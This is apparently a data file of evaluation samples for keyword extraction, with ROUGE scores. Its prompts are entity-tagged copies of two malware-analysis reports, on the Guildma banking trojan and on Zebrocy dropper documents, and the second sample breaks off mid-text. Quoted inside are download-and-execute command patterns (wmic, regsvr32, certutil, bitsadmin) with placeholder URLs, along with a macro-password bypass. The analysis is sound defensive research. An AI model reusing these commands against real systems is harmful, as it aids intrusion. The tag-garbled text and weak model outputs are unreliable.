[{"split_name": "val", "sample_id": "val_0", "prompt_text": "Extract the keywords: [CARDINAL] 3/14/2020Guildma : The Devil drives electric | WeLiveSecurityGuildma : The Devil drives electric [DATE] welivesecurity.com/2020/03/05/guildma-devil-drives-electricMarch [DATE] 5 , 2020In this blogpost , we will examine [PERSON] Guildma ( also known as Astaroth , a powerful demon ) , a highly prevalent [NORP] Latin [NORP] American banking trojan . This [GPE] Brazil - targeting trojan , written in [ORG] Delphi , boasts some innovative execution and attack techniques . We will describe the most recent version , highlighting the most notable changes made since [DATE] the [DATE] middle [DATE] of [DATE] 2019 when an avalanche of articles about [PERSON] Guildma was published in response to its largest campaign to date . [PERSON] Characteristics [PERSON] Guildma is a [NORP] Latin [NORP] American banking trojan that targets [GPE] Brazil exclusively . Based on our telemetry \u2014 as well as the public attention it has received \u2014 we believe it to be the most impactful and advanced banking trojan in the region . Besides targeting \ufb01nancial institutions , [PERSON] Guildma also attempts to steal credentials for email accounts , e\u2011shops and streaming services , and affects [CARDINAL] at [CARDINAL] least [CARDINAL] ten times as many victims as other [NORP] Latin [NORP] American banking trojans already described in this series . It uses innovative methods of execution and sophisticated attack techniques . Unlike the [NORP] Latin [NORP] American banking trojans we have described previously , [PERSON] Guildma does not store the fake pop - up windows it uses within the binary . Instead , the attack is orchestrated by its [ORG] C&C server . This gives the authors greater \ufb02exibility to react to countermeasures implemented by the targeted banks . Guildma implements the following backdoor functionalities : Taking screenshots [ORG] Capturing keystrokes Emulating keyboard and mouse Blocking shortcuts ( such as disabling Alt + F4 to make it harder to get rid of fake windows it may display ) Downloading and executing \ufb01les Restarting the [DATE] machineGuildma is very modular . At the time of writing , it consists of [QUANTITY] 10 [QUANTITY] modules , not including distribution chain stages . The functionality of individual modules will be discussed later . Evolution of distribution chains Our telemetry indicates [PERSON] Guildma spreads exclusively through spam emails with malicious attachments . Here are a few examples from a campaign from [DATE] the [DATE] middle [DATE] of [DATE] November 2019.url The Devil drives electric | WeLiveSecurityFigure [CARDINAL] 1 . Spam email example ( translation : \u201c Hello , please explain these photos to me . I \u2019m waiting for yourexplanation!\u201d)Figure [CARDINAL] 2 . Spam email example ( translation : \u201c Dear member of cons\u00f3rcio , attached is the proof of bid no.75432.\u201d)url The Devil drives electric | WeLiveSecurityFigure [CARDINAL] 3 . Spam email example ( translation : \u201c Good morning , I am sending the proof of transfer \u2013 DOC.Citibank\u201d)Figure [CARDINAL] 4 . Spam email example . Fake invoice reminder stating that a payment is due [DATE] the [DATE] day [DATE] after [DATE] tomorrow andthat the payment may take [TIME] up [TIME] to [TIME] 72 [TIME] hours to be processed . [CARDINAL] One of the de\ufb01ning characteristics of [ORG] Guildma \u2019s distribution chains is using tools already present on the system , often in new and unusual ways.url The Devil drives electric | WeLiveSecurityAnother characteristic is reusing techniques . New techniques are added every once in a while , but for the most part , the developers seem to simply reuse techniques from older versions . Figure [CARDINAL] 5 . Distribution chain of [PERSON] Guildma in version [DATE] 150Figure [DATE] 5 shows the distribution chain for version [CARDINAL] 150 , but the structure of [ORG] Guildma \u2019s distribution chains is very dynamic . For instance , in previous versions , the malicious [ORG] LNK \ufb01le shown in Figure [CARDINAL] 5 was not embedded in a ZIP archive , or an [ORG] SFX RAR archive containing an MSI installer was used instead . Also , there used to be another JScript stage whose sole purpose was downloading and executing the \ufb01nal JScript stage ; there have been too many changes overall to \ufb01t into this article . In fact , the only part that has mostly stayed the same is the \ufb01nal JScript stage . Using data from our long - term , in - depth tracking of this family , we have compiled a very good picture of [ORG] Guildma \u2019s activity . Figure [CARDINAL] 6 shows all ESET detections of [ORG] Guildma \u2019s \ufb01rst - stage component . As you can see , the campaigns were ramping up slowly until a massive campaign in [DATE] August [DATE] 2019 , when we were seeing [CARDINAL] up [CARDINAL] to [CARDINAL] 50,000 samples per day . This campaign went on for [DATE] almost [DATE] two [DATE] months and accounted for more than double the amount of detections we had seen in [DATE] the [DATE] 10 [DATE] months prior . Figure [CARDINAL] 6 . [ORDINAL] First stage [PERSON] Guildma detections since [DATE] October [DATE] 2018Following is a summary of some of the more interesting techniques used in [DATE] the [DATE] last [DATE] 14 [DATE] months . Execution of the JScript stageurl The Devil drives electric | WeLiveSecurityOver [DATE] the [DATE] last [DATE] year , [PERSON] Guildma has used several methods of executing the JScript stages of its distribution chain . At [DATE] the [DATE] end [DATE] of [DATE] 2018 , [PERSON] Guildma was hiding its code in eXtensible [PERSON] Stylesheet [PERSON] Language ( .xsl ) \ufb01les and using wmic.exe to download and execute them : wmic.exe < wmic query > /format:\u201d<URL>\u201dIt then brie\ufb02y moved on to using [GPE] regsvr32.exe and scrobj.dll to download a JScript - implemented [ORG] COM object and execute its registration routine ( which contained the malicious code):regsvr32.exe /s /n /u /i:<URL > scrobj.dllMost recently , the authors started abusing [ORG] Windows [ORG] Explorer to execute the JScript stage . This attack relies on the fact that Windows Explorer will try to open any \ufb01le passed to it on the command line with its associated program and the fact that the default association for .js \ufb01les is the Microsoft Windows Script Host . The \u201c script \u201d passed to [ORG] Windows [ORG] Explorer is a single command whose purpose is to download and execute the actual JScript stage : echo GetObject(\u2018script:<URL > \u2019 ) > < \ufb01le>.js | explorer.exe < random switches > < \ufb01le>.js Execution of the binary modules Methods of running the [ORG] PE modules are no less diverse . When we started tracking [PERSON] Guildma , it was abusing Avast \u2019s aswRunDll.exe to launch the \ufb01rst binary stage , with regsvr32.exe as a failover for computers where Avast \u2019s products were n\u2019t installed . The use of aswRunDll.exe was then dropped , leaving regsvr32.exe as the sole method of execution . After a brief period of using rundll32.exe , [PERSON] Guildma switched to its current execution method \u2014 ExtExport.exe.ExtExport.exe is an undocumented component of [ORG] Microsoft [ORG] Internet [ORG] Explorer used for exporting bookmarks from [ORG] Mozilla [ORG] Firefox and 360 [PERSON] Secure [PERSON] Browser , and can be abused for [ORG] DLL Side- [PERSON] Loading . When the following command is executed , mozcrt19.dll , [ORG] mozsqlite3.dll , and [ORG] sqlite3.dll are loaded from the folder speci\ufb01ed on the command line : C:\\Program Files\\Internet Explorer\\ExtExport.exe < folder > < dummy 1 > < dummy 2 > To abuse this , you would normally drop the [ORG] DLL to be loaded as one of the above - mentioned \ufb01les ; [PERSON] Guildma uses all [CARDINAL] three . Downloading the binary modules [PERSON] Guildma has also utilized a couple of different ways to download the binary modules . The \ufb01rst version was using certutil.exe copied to certis.exe ( presumably to evade detection):certis.exe -urlcache -split -f \u201c < URL > \u201d \u201c < destination path>\u201dThe authors then switched to [GPE] BITSAdmin \u2014 [ORG] the [ORG] Microsoft [ORG] Background [ORG] Intelligent [ORG] Transfer [ORG] Service management tool \u2014 and are still using it at the time of writing : bitsadmin.exe /transfer < random number > /priority foreground < URL > < destination > url The Devil drives electric | WeLiveSecurityFor [DATE] a [DATE] couple [DATE] months , the binary modules were base64 - encoded and hosted on Google Cloud . In that time , [PERSON] Guildma was using both [GPE] BITSAdmin and certutil \u2014 [GPE] BITSAdmin to download the modules and certutil to decode them . Other changes [PERSON] Guildma uses strange , non - descriptive variable and function names . When we started tracking [PERSON] Guildma , the names , while nonsensical , were clearly man - made ( e.g. \u201c radador \u201d for the random number function or \u201c Bxaki \u201d for the download function ) . In [DATE] June [DATE] 2019 they were all changed to random - looking names ( e.g. \u201c bx021 \u201d and \u201c [WORK_OF_ART] mrc430 \u201d ) . At \ufb01rst , we thought the authors implemented some kind of an automated script obfuscator , but it turned out to be a onetime change and the names have remained the same since . A relatively new addition is the age - old technique of using [ORG] ADS ( [ORG] Alternate [ORG] Data [ORG] Streams ) to store the binary modules . All the modules are now stored as ADS of a single \ufb01le ( e.g. \u201c desktop.ini : nauwuygiaa.jpg \u201d , \u201c desktop.ini : nauwuygiab.jpg \u201d , etc . ) . Version history [PERSON] Guildma has seemingly gone through many versions during its development , but there was usually very little development between versions \u2014 due to its clunky architecture utilizing hardcoded con\ufb01guration values , for the most part the authors have to recompile all the binaries for every new campaign . A job that is clearly not completely automated , since there has often been a signi\ufb01cant delay between updating the version number in the scripts and in the binaries . In this article , we cover version [CARDINAL] 150 , but since we started writing , [CARDINAL] two more versions have been released . They contain no substantial change in functionality or distribution , supporting our claims about [ORG] Guildma \u2019s development cycle . The \ufb01nal stage of the distribution chain used to contain a version name ( and even before that , it used to download said name along with the binary modules ) , but it has been ( presumably ) permanently replaced with a simple \u201c xXx \u201d since version [CARDINAL] 148.Table [CARDINAL] 1 summarizes all the versions released since we started tracking [PERSON] Guildma actively in [DATE] October [DATE] 2018 . Looking at the version strings , we get the feeling the author is passionate about ecology and fast cars . Table 1 . Guildma version historyVersion number Version nameFirst seen [DATE] 2018 [DATE] - 09 - 18 131 2018 - 10 - 31 132 2018 - 11 - 28 133 2018 - 11 - 29 134Version pre\ufb01x 134_MAXX_TESLAsdwqiopawsamazonurl The Devil drives electric | WeLiveSecurityVersion number Version nameFirst seen [DATE] 2018 [DATE] - 12 [DATE] - 03 135 2018 - 12 - 13 136 2019 - 02 - 06 137 2019 - 03 - 21 138 2019 - 05 - 20 139 2019 - 06 - 03 140 2019 - 06 - 24 141 2019 - 07 - 17 142 2019 - 08 - 09 143 2019 - 08 - 26 144 2019 - 09 - 26 145 2019 - 10 - 16 146 2019 - 11 - 04 147 2019 - 11 - 19 148 2019 - 11 - 22 149 2019 - 12 - 13 150 2020 [DATE] - 01 [DATE] - [DATE] 14 151 2020 - 02 - 05 152Version pre\ufb01x As mentioned earlier , [PERSON] Guildma is very modular ; the structure of its modules seems to be mostly constant . In this section , we will brie\ufb02y describe the functionality of each module . All module names are composed of a shared , version - dependent pre\ufb01x and a module - speci\ufb01c suf\ufb01x . In [LAW] Table [LAW] 2 , the version - dependent pre\ufb01x is andrealfo . Table 2 . [PERSON] Guildma module overviewURL \ufb01lename andrealfohh1a.dll.zip andrealfo64.~Filesystem \ufb01lenameModule [ORG] Main module loader [CARDINAL] 1 ( part [DATE] 1)url The Devil drives electric | WeLiveSecurityURL \ufb01lename andrealfohh1b.dll.zip andrealfoxa.gif.zip andrealfoxb.gif.zip andrealfoxc.gif.zip andrealfogx.gif.zip andrealfog.gif.zip andrealfoc.jpg.zipFilesystem wwn.gif.zip andrealfodx.gif.zip andrealfoa.jpg.zip andrealfob.jpg.zip andrealfoi.gif.zipandrealfodwwn.gifandrealfodx.gif [ORG] Main module loader [CARDINAL] 1 ( part [CARDINAL] 2 ) [ORG] Main module injector ( part [CARDINAL] 1 ) [ORG] Main module injector ( part [CARDINAL] 2 ) [ORG] Main module injector ( part [CARDINAL] 3 ) [ORG] Main module loader [CARDINAL] 2 [ORG] Main module Contacts stealer and form grabber module [ORG] RAT module ( [NORP] DLL)RAT module ( EXE ) JScript dropper moduleWith the exception of the main module loader [CARDINAL] 1 ( * [CARDINAL] 64.~ ) and the main module injector ( * xa.gif , * xb.gif and * xc.gif ) , all the modules are encrypted with a simple XOR cipher using a repeating 32- byte key . The key is generated from a [QUANTITY] 32 [QUANTITY] - bit seed using the algorithm shown in Figure [CARDINAL] 7 . The seed value is obfuscated in the binaries to prevent simple extraction ( see Figure 8).1 for i in range ( [CARDINAL] 32 ): key . append ( seed & 0xff ) ; seed > > = 1;Figure 7 . Key generation algorithmurl The Devil drives electric | WeLiveSecurityFigure [CARDINAL] 8 . Seed obfuscation in the binaryThree modules communicate with a [ORG] C&C server : [ORG] Main module , [ORG] RAT module , and [ORG] Contacts stealer and form grabber . The communication is done over HTTP(S ) using a combination of base64 and various simple custom encryption algorithms to protect the data being transferred . In the next section , we describe how the [ORG] C&C server address is obtained . [ORG] Main module loader [CARDINAL] 1 ( * [CARDINAL] 64.~ ) This is the \ufb01rst binary stage of the chain . The \ufb01le is a [ORG] DLL downloaded in [CARDINAL] two parts , which are concatenated by the previous JScript stage . It loads the [CARDINAL] three \ufb01les comprising the next stage loader ( * xa.gif , * xb.gif and * xc.gif ) , concatenates them , maps the resulting [ORG] PE \ufb01le into its own address space and executes it . Loading a [ORG] PE \ufb01le is a relatively complex process , so the authors used the [PERSON] BTMemoryModule open - source library for this purpose . [ORG] Main module injector ( * xa.gif + * xb.gif + * xc.gif ) This module loads the next stage ( * gx.gif ) from disk and decrypts it . It then runs the \ufb01rst existing executable from the following list and injects the decrypted payload into it . C:\\Program [CARDINAL] Files\\AVAST [PRODUCT] Software\\Avast\\aswRunDll.exe [PRODUCT] C:\\Program [PRODUCT] Files\\Diebold\\Warsaw\\unins000.exe * C:\\Windows\\SysWOW64\\userinit.exe C:\\Windows\\System32\\userinit.exeAn application , popular in [GPE] Brazil , to protect access to online banking . * Main module loader [CARDINAL] 2 ( * gx.gif ) The last loader stage is very simple and seems to needlessly duplicate the functionality of main module loader [CARDINAL] 1 . It loads and decrypts the main module ( * g.gif ) , maps it into its own memory space and executes it . [ORG] Main module ( * g.gif)url The Devil drives electric | WeLiveSecurityGuildma \u2019s main module orchestrates all the remaining modules . Its implementation is deceptively complex , using countless timers and events , but its functionality is actually relatively simple . It contains legacy code that is not being used anymore as well as pre - production code that is not being used yet . On loading , this module checks if it is running in a sandboxed environment ( for example , by examining the computer name and system disk volume ID ) , if there are other running instances of itself ( based on window names ) and if the system locale is different from [NORP] Portuguese . If any check reveals the system is uninteresting or already compromised by [PERSON] Guildma , the malware terminates . Otherwise , the module then collects information from the system ( computer name , which security software is being used , installed programs \u2026 ) and establishes contact with the [ORG] C&C server . It then starts monitoring interesting events , mainly when certain applications are launched or online banking sites opened , and executing appropriate actions ( e.g. taking screenshots , preventing the user from closing the window by intercepting keyboard shortcuts , launching the [ORG] RAT module , and so on).The module also implements backdoor commands whose functionality largely overlaps with the [ORG] RAT module . Contact stealer and form grabber ( * c.jpg ) This module has [CARDINAL] two functions \u2014 gathering email addresses and form data from webpages . Email addresses are obtained from desktop email clients ( such as [ORG] Microsoft [ORG] Outlook , [PRODUCT] Thunderbird and The [PERSON] Bat ! ) by parsing their address books as well as the emails themselves . The form grabber uses Windows COM technology to interact with Internet Explorer . It waits until a targeted site is opened ( mostly [NORP] Brazilian webmails , e - shops and payment gateways ) and then logs the user out , forcing the victim to input credentials . It then retrieves the DOM and looks for important input \ufb01eld values ( such as usernames , passwords and credit card numbers ) . RAT module ( * dwwn.gif , * dx.gif ) The [ORG] RAT module comes in [CARDINAL] two functionally identical compilations \u2014 [ORG] DLL ( * dwwn.gif ) and [PERSON] EXE ( * .dx.gif).It implements download and execute functionality , can take screenshots , emulate keyboard and mouse input , and restart the computer . Most [NORP] Latin [NORP] American banking trojans display fake pop - up windows based on monitoring the active window \u2019s name . These windows are usually stored in the binary . We have not found such code in [PERSON] Guildma , but the [ORG] RAT module contains a [ORG] Delphi form implementing a simple web browser . Since it is also executed based on the active window \u2019s name , we believe this form is used for displaying fake dialogs to the user . MailPassView ( * a.jpg ) and BrowserPassView ( * b.jpg)url The Devil drives electric | [NORP] WeLiveSecurityThese are freeware tools from [ORG] Nirsoft for extracting saved credentials from popular email clients and web browsers respectively . Since [GPE] Nirsoft has removed support for quiet operation ( output to \ufb01le , with no GUI ) from newer versions to curb the abuse of these tools by malware , [ORG] Guildma \u2019s authors are using older versions that had those features . The same tools are also leveraged by [NORP] Mispadu , except [ORG] Mispadu is using newer versions with quiet operation support patched back in . JScript dropper module ( * i.gif ) This module drops and executes ( using cscript.exe ) a JScript \ufb01le . The script consists of [CARDINAL] two parts \u2014 the \ufb01rst part is stored as [CARDINAL] one long encrypted string , while the [ORDINAL] second part is assembled from many short strings ( some encrypted and some in plaintext ) . Worthy of note is the fact that strings in the dropped [PERSON] JScript \ufb01le are encrypted by this dropper module with a randomly generated key , so they are present in the clear in the dropper . The script executes the following actions : [ORG] Disables [ORG] UAC [PERSON] Disables [PERSON] EXE signature checking [PERSON] Disables [PERSON] Windows [PERSON] Defender [PERSON] Creates a \ufb01rewall rule disabling network access for [FAC] C:\\Program Files\\AVAST Software\\Avast\\Setup\\avast.setup [PERSON] Disables wsddntf driver ( [ORG] Diebold [ORG] Warsaw [ORG] GAS [GPE] Tecnologia \u2014 the banking access protection software introduced earlier ) Adds a \ufb01rewall exception for \ufb01les used as injection targetsC:\\Program Files\\Diebold\\Warsaw\\unins000.exe C:\\Program Files\\AVAST Software\\Avast\\aswRunDll.exeWe believe this module may still be in development as we have never observed it on our test machines dropping the script . New developments ( since [PERSON] mid-2019)New [PERSON] C&C retrieval In version [CARDINAL] 142 , a new way of distributing [ORG] C&C servers , abusing [ORG] YouTube and Facebook pro\ufb01les , was implemented . However , the authors stopped using Facebook almost immediately and , at the time of writing , are fully relying on [ORG] YouTube . This is similar to [GPE] Casbaneiro , but a bit cruder . While [PERSON] Casbaneiro was hiding the data in video descriptions and obfuscating it as a part of a URL , [PERSON] Guildma simply places the data in the channel description . The start and end of the encrypted [ORG] C&C addresses is delimited by \u201c ||| \u201d . The data in between is base64 encoded and encrypted using [ORG] Mispadu \u2019s string encryption algorithm . This is now the primary method of retrieving [ORG] C&C servers ; the old method ( described by Avast ) is still present as a backup.url The Devil drives electric | WeLiveSecurityFigure [CARDINAL] 9 . [PERSON] Encrypted [PERSON] Guildma C&C server domains stored on YouTubeModules added and removed The previously described JScript dropper module was added in version [CARDINAL] 145 . Conversely , in version [CARDINAL] 139 , [PERSON] Guildma dropped [CARDINAL] two other modules present in older versions \u2014 mass mailer ( * f.jpg ) and its loader ( * e.jpg ) . In the next few versions , these modules were still accessible under the expected names ( < version pre\ufb01x > e.jpg and < version pre\ufb01x > f.jpg ) from the same server as the other modules . This leads us to believe these modules are still being developed , but are now only distributed as needed , presumably using the download and execute backdoor command . New string encryption The JScript dropper module brought with it a new string encryption algorithm . A variant of this algorithm ( shown in Figure [CARDINAL] 10 ) was propagated into other modules in version [CARDINAL] 147.url The Devil drives electric | WeLiveSecuritydef decrypt ( ct , key ): [CARDINAL] # stage [CARDINAL] 1 ct = unhexlify ( ct ) ; last = ct [ 0 ] ; s = bytearray ( ct [ [CARDINAL] 1 : ] ) ; for i in range ( len ( s ) ): x = s [ i ] ^ key [ i % len ( key ) ] ; if last > x : last = s [ i ] ; s [ i ] = x ; [CARDINAL] # stage [CARDINAL] 2 - reverse string s = s [: : -1 ] ; [CARDINAL] # stage [CARDINAL] 3 - c = not ( c - 10 ) s = \" \" . join ( [ chr ( ( ~ ( c - 10 ) ) & 0xff ) for c in s ] ) ; [CARDINAL] # stage [TIME] 4 [TIME] - [TIME] Base25 decode and key subtraction k = ord ( s [ 0 ] ) - 65 ; ot = \" \" ; for i in range ( [CARDINAL] 1 , len ( s ) , [CARDINAL] 2 ): ot + = chr ( ( ord ( s [ i ] ) - 65 ) * [QUANTITY] 25 [QUANTITY] + ord ( s [ i + 1 ] ) - 65 - k - 100 ) ; return ot;1 [DATE] 26Figure [DATE] 10 . New string encryption algorithmurl The Devil drives electric | WeLiveSecurityOriginally , [PERSON] Guildma was using the same string encryption as [GPE] Casbaneiro . The new algorithm has [CARDINAL] four stages and as you can see , the original string encryption algorithm is still used as the \ufb01rst stage . Also of note is the fact that the [ORDINAL] fourth stage is once again using [ORG] Mispadu \u2019s encryption algorithm . In version [CARDINAL] 148 Guildma implemented a string table ; all strings are decrypted at the beginning of execution and accessed from the table when needed . Removal of international targets In version [CARDINAL] 138 , [PERSON] Guildma added capability to target institutions ( mainly banks ) outside of [GPE] Brazil . Despite that , we have observed no international campaigns ; the campaigns hosting \ufb01les on [ORG] Cloud\ufb02are Workers \u2019 infrastructure even went as far as to block any downloads from non [NORP] - [NORP] Brazilian IPs . In fact , in [DATE] the [DATE] last [DATE] 14 [DATE] months we have n\u2019t seen any campaign targeting users outside of [GPE] Brazil . Finally , in version [CARDINAL] 145 , the capability to target institutions outside of [GPE] Brazil was removed . Based on these facts , we believe it was merely an in - development feature which ended up being In this part of the series , we have talked about [PERSON] Guildma , the most prevalent [NORP] Latin [NORP] American banking trojan we have seen . We have shown its rich historical developments while focusing on the most recent variant . [PERSON] Guildma once again shares the prevailing characteristics of a [NORP] Latin [NORP] American banking trojan . It is written in [ORG] Delphi , targets the region , implements backdoor functionality , splits its functionality into many modules and abuses legitimate tools . [PERSON] Guildma also shares interesting common features with families described earlier in this series . Namely , its current encryption algorithm combines the ones used by [GPE] Casbaneiro and [NORP] Mispadu . For any inquiries , contact us at threatintel@eset.com . Indicators of Compromise can also be found in our GitHub repository . Indicators of Compromise ( IoCs)HashesSHA-1 [ORG] Main module loader 1injectorESET Detection name Win32 / Spy . Guild\u2010 ma . BM Win32 / Spy . Guild\u2010 ma . BJurl The Devil drives electric | WeLiveSecuritySHA-1 er and form Win32 / Spy . Guild\u2010 ma . Q Win32 / Spy . Guild\u2010 ma . BS Win32 / Spy . Guild\u2010 C:\\Users\\Public\\Libraries\\qlanl\\ * Startup link LocationWin32 / Spy . Guild\u2010 ma . BR Win32 / Spy . Guild\u2010 ma . BR(DLL ) MailPassView Win32 / PSWTool.\u2010 MailPassView . E Win32 / PSWTool . W Win32 / Spy . Guild\u2010 module%APPDATA%\\Microsoft\\Programs\\StartUp\\reiast%USERNAME%%COMPUTERNAME%.lnkTargetsC:\\Program Files ( x86)\\Internet Explorer\\ExtExport.exe C:\\Program Files\\Internet Explorer\\ExtExport.exeArgs < install dir > < rand > < rand > ( where < rand > is a random , [CARDINAL] 5 to [CARDINAL] 9 character long string generated from the alphabet qwertyuiop1lgfdsas2dfghj3zcvbnmm ) [ORG] C&C serversurl The Devil drives electric | WeLiveSecurityurl url url url url url url url url url url url url [PERSON] ATT&CK techniquesNameTactic ID tionT1060 Registry Run T1197 BITS Jobs T1089 Disabling Se\u2010curity ToolsT1140 [ORG] Deobfuscate/ [ORG] T1073 [ORG] DLL Side - LoadingT1096 NTFS File [ORG] AttributesDescription [ORG] Guildma distribution chains start with a malicious email attachment . [PERSON] Guildma utilizes rundll32.exe to execute its binary modules . Guildma abuses WMIC.exe to execute some of its distribution chain stages . Guildma ensures persistence by creating a [ORG] LNK \ufb01le in the % STARTUP% folder.BITSAdmin.exe is used to download binary modules . [PERSON] Guildma disables [PERSON] Windows [PERSON] Defender . The majority of [PERSON] Guildma modules need to be decrypt\u2010 ed after downloading . Guildma abuses ExtExport.exe for [ORG] DLL Side [ORG] - [ORG] Loading . [PERSON] Guildma utilizes ADS to hide its modules on disk.url The Devil drives electric | WeLiveSecurityTactic IDNameT1055 Process Injection T1064 ScriptingT1220 XSL Script ProcessingT1081 Credentials inFilesT1214 Credentials inRegistryT1083 File and Di\u2010 DiscoveryT1063 Security Soft\u2010ware DiscoveryT1082 System Infor\u2010mation DiscoveryT1497 Virtualization / Sandbox ic [PERSON] ProtocolT1041 [PERSON] Ex\ufb01ltration [PERSON] Guildma utilizes process injection when executing its modules . Guildma implements its distribution chain stages in various scripting languages ( mainly [PERSON] JScript ) . [PERSON] Guildma utilizes XSL script(s ) in its distribution chains . [PERSON] Guildma extracts credentials stored by web browsers and email clients in \ufb01les . [PERSON] Guildma extracts credentials stored by web browsers and email clients in [ORG] Windows [ORG] Registry . [PERSON] Guildma uses presence of certain \ufb01les to determine whether banking and security tools are installed . [PERSON] Guildma uses window discovery to \ufb01nd and terminate older versions of itself and to detect when interesting programs ( e.g. banking applications or web browsers ) are running . [PERSON] Guildma detects the presence of several security products . [PERSON] Guildma collects OS version and bitness , computer name and system locale . [PERSON] Guildma uses directory names , computer names , vol\u2010 ume IDs , and existence of named objects to detect sandboxes and virtualized environments . [PERSON] Guildma is capable of taking screenshots . New [ORG] C&C addresses are encrypted using custom en\u2010 cryption algorithms . [PERSON] Guildma uploads screenshots and log \ufb01les to the [ORG] C&C server.url The Devil drives electric | WeLiveSecurityESET Research 5 Mar 2020 - 11:30AMurl", "generated_text": "the document; Guildma; Astaroth; financially institutions; Brazil; 2019; detection; screenshots; eshops; streaming services; at least ten times; victims; the attacker; C&C server; command; control; servers; The most recent version; a new version; the malware; a variety; tools; previously published versions; the evolution; the distribution chain; the authors; new techniques; techniques; a number; the most recent version; the most recent version; versions.", "ref_text": "<START-1>The PDF describes Guildma, a prevalent Brazilian banking trojan written in Delphi. Guildma spreads through spam emails containing malicious attachments and has modular architecture consisting of 10 modules. It implements backdoor functionality like screenshotting, keylogging, and downloading additional payloads. Guildma retrieves C&C servers from YouTube channel descriptions encrypted using custom algorithms. It uses innovative techniques for execution and attack, like abusing Windows Explorer, BITSAdmin, and ExtExport. The PDF analyzes the evolution of Guildma's distribution chains, which reuse old techniques and leverage tools already on the system like WMIC, RegSvr32, and CertUtil. The modules are XOR encrypted and some contain stolen credential extraction tools. Recent developments include new string encryption algorithms combining those of other trojans, and social media C&C retrieval. Guildma is constantly updated but has redundant legacy code. It solely targets Brazil and checks for sandbox environments. In summary, Guildma is an advanced, prevalent banking trojan active in Brazil that uses unique techniques for distribution, execution, command and control, and credential theft. It is under active development and continues to evolve its tactics. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.46056782334384855, "gpt3/lexical/rouge_rouge2": 0.17142857142857143, "gpt3/lexical/rouge_rougeL": 0.22082018927444796, "gpt3/lexical/rouge_rougeLsum": 0.22082018927444796, "gpt3_generated_text": ["This article discusses Guildma, a powerful Latin American banking trojan also known as Astaroth. The trojan primarily targets financial institutions in Brazil and has gained attention for its innovative execution and attack techniques. It not only steals financial credentials but also targets email accounts, e-shops, and streaming services. Guildma is modular and consists of 10 modules, with functionalities such as taking screenshots, capturing keystrokes, and blocking shortcuts. The trojan spreads through spam emails with malicious attachments and utilizes tools already present on the system. The distribution chain of Guildma is dynamic, with new techniques being added and older techniques being reused. The article also highlights the evolution of Guildma's distribution chains and the increase in its detection since August 2019. Overall, Guildma is considered to be the most impactful and advanced banking trojan in the Latin American region."]}, {"split_name": "val", "sample_id": "val_1", "prompt_text": "Extract the keywords: A [WORK_OF_ART] Deep [WORK_OF_ART] Dive into Zebrocy \u2019s Dropper Docslabs.sentinelone.com/a-deep-dive-into-zebrocys-dropper-docsMarco FigueroaApril 19 , [ORG] 2021Sofacy is an [ORG] APT threat actor that \u2019s been around since [DATE] 2008 and rose to prominence with the election hacks of [DATE] 2016 . Better known as [ORG] FancyBear or [PERSON] APT28 , this threat actor targets governments , military , and private organizations and has been known to engage in hack- and - leak operations . In [DATE] the [DATE] past [DATE] couple [DATE] of [DATE] years , [ORG] Sofacy has drastically retooled and largely evaded analysts . [CARDINAL] One of the more consistent subgroups is known as [PERSON] Zebrocy . Their targeting appears primarily focused on former [NORP] Soviet Republics and , more recently , [LOC] Asia . In [DATE] March [DATE] 2021 , we observed a cluster of activities targeting [GPE] Kazakhstan with Delphocy \u2013 malware written in [ORG] Delphi and previously associated with [PERSON] Zebrocy . The Word documents that were observed purport to be from a [ORG] Kazakhy company named [EVENT] Kazchrome , a mining and metal company and [CARDINAL] one of the world \u2019s largest producers of chrome ore and ferroalloys . In total , we found six Delphocy Word documents that appear to be related to this cluster , all of which contain the same [ORG] VBA script that drops a [ORG] PE . Out of the [CARDINAL] six Word documents , [CARDINAL] two appear to be authentic uploads to [ORG] VirusTotal by victims originating from [GPE] Kazakhstan . The uploaded files contain what appeared to be the original filenames \u0410\u0432\u0430\u043d\u0441\u043e\u0432\u044b\u0439 \u043e\u0442\u0447\u0435\u0442(\u043d\u043e\u0432\u044b\u0439).doc and [NORP] \u0424\u043e\u0440\u043c\u0430 \u0434\u043e\u043a\u043b\u0430\u0434\u043d\u043e\u0439 ( \u0441\u043b\u0443\u0436\u0435\u0431\u043d\u043e\u0439 ) \u0437\u0430\u043f\u0438\u0441\u043a\u0438.doc . In this post , we take a deep dive into these samples and share some techniques other analysts can employ to reverse engineer [PERSON] Delphocy dropper docs . We show how researchers can bypass password - protected macros and describe both how to decompile [ORG] Delphi using [ORG] IDR ( Interactive Delphi Reconstructor ) and how to import the saved IDC file into [PERSON] Ghidra using dhrake \u2019s plugin.1/11The results of our analysis led us to discover further Zebrocy clusters ; a list of IOCs and [ORG] YARA detection rules are provided to enable threat hunters to search for these and related artifacts in their environments . Bypassing [PERSON] VBA [PERSON] Macro Password ProtectionWhen analyzing [ORG] Office documents with [ORG] VBA macros , threat hunters have many different tools and techniques that do the job , but I \u2019ve built a habit that I still use when I first started reversing malware to bypass password - protected macros manually.1 . Open up your favorite hex editor . I use HxD. 2 . Load the Word Document . [CARDINAL] 3 . Search for the following text:1 . CMG= [CARDINAL] 2 . GC= [CARDINAL] 3 . DPB=4 . Add an x to each of them:1 . CMGx= [CARDINAL] 2 . GCx= [CARDINAL] 3 . DPBx=5 . Save the file with the changes.2/11When opening the Word document and viewing the macro this time , you can see the script as well as the Forms . When analyzing the function , what immediately sticks out is the ert . [ORG] DataType = \u201c bin.base64 \u201d , showing that the [ORG] UserForm1 is encoded with base64.Wininition UserFormWhen selecting on UserForm1 , the textbox reveals a base64 encoded string ; we know this because of the function we discussed above . The next step is to copy the entire string into a file so it can be decoded.3/11Now we decode the binary from base64 and save it to disk as wininition.exe .Following that , clean the headers using [ORG] HxD , and then use [ORG] PE - Bear to fix the sections headers to move to the next phase of the analysis.4/11When triaging a binary , the go - to tool is Hiew to investigate and look for clues for a deeper understanding . With wininition , I notice the [FAC] Embarcadero string , which means that this binary was written in [GPE] Delphi . When reversing [ORG] Delphi binaries I [ORG] \u2019ve always used [ORG] IDR ( Interactive [ORG] Delphi [ORG] Reconstructor ) . [ORG] IDR is a decompiler of executable files and dynamic libraries ( [ORG] DLL ) written in Delphi.5/11Reversing Delphi Binaries with [PERSON] Ghidra and dhrakeWhen searching for the latest developments with [ORG] IDR , I came across a fantastic plugin for [PERSON] Ghidra , a collection of scripts for reverse engineering [ORG] Delphi binaires in [PERSON] Ghidra using [ORG] IDR \u2019s output to IDC . It was published over [DATE] a [DATE] year [DATE] ago , but it is a gem if threat hunters are using Ghidra.dhrake allows you to import the IDC file from [ORG] IDR into [PERSON] Ghidra . This will import the [ORG] 